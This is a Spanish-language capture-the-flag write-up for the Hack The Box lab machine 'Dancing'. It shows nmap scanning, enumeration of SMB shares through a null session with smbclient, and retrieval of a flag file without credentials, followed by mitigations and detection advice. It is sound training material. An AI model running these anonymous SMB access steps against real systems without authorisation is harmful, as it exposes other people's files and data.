---
machine: Dancing
os: Windows
difficulty: Very Easy
platform: Hack The Box
achievement: https://labs.hackthebox.com/achievement/machine/4187928/395
category: Starting Point
state: Available
pwned: 2026-11-01
tags: [windows, smb, null-session]
---

# Dancing — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> Máquina **disponible** de Starting Point (Tier 0). Sin flags en este documento.

## TL;DR

SMB abierto con sesión nula. Se listan los recursos compartidos, se entra en `WorkShares` sin credenciales y dentro están las notas y la flag. No hay exploit: es mala configuración pura.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 135,139,445 <TARGET_IP>
```

| Puerto | Servicio |
|---|---|
| 135/tcp | MSRPC |
| 139/tcp | NetBIOS |
| 445/tcp | SMB (Windows) |

## Enumeración

```bash
smbclient -L //<TARGET_IP> -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

`-N` = sin usuario ni contraseña. El servidor acepta la sesión nula y lista los recursos.

## Foothold

```bash
smbclient //<TARGET_IP>/WorkShares -N
```

```
smb: \> ls
  Amy.J      D        0  ...
  James.P    D        0  ...

smb: \> cd James.P
smb: \James.P\> ls
  flag.txt
smb: \James.P\> get flag.txt
smb: \James.P\> exit
```

```bash
cat flag.txt      # <FLAG>
type flag.txt     # en Windows
```

Dentro de `Amy.J` hay un `worknotes.txt` con anotaciones del usuario; sirve para entender el entorno, no para escalar.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

- No aplica: la flag está en el propio servicio comprometido; no hay usuario de sistema que comprometer ni escalada posterior.

## Evidencia

- Salida de `smbclient -L` con la sesión nula aceptada.
- Listado de `WorkShares` y contenido de `flag.txt` recortado.

## Lecciones aprendidas

- La sesión nula (`IPC$`/guest) sigue siendo una de las primeras cosas que probar en SMB.
- Un recurso con permisos de lectura para `Everyone` es una fuga de información completa, sin necesidad de exploit.
- Las notas de los usuarios (`worknotes.txt`) son contexto útil: nombres, rutas y servicios internos.

## Mitigaciones y detección

- Deshabilitar la cuenta `Guest` y rechazar sesiones nulas (`RestrictNullSessAccess=1`, `RestrictAnonymous=1`).
- Revisar las ACL de cada share: sólo los grupos que lo necesiten.
- Firmar SMB (`RequireSecuritySignature`) y desactivar SMBv1.
- Detección: logins `ANONYMOUS LOGON` en el Event ID 4624 y accesos 5140 a shares desde cuentas no autenticadas.

## Referencias

- <https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview>
- <https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb.html>
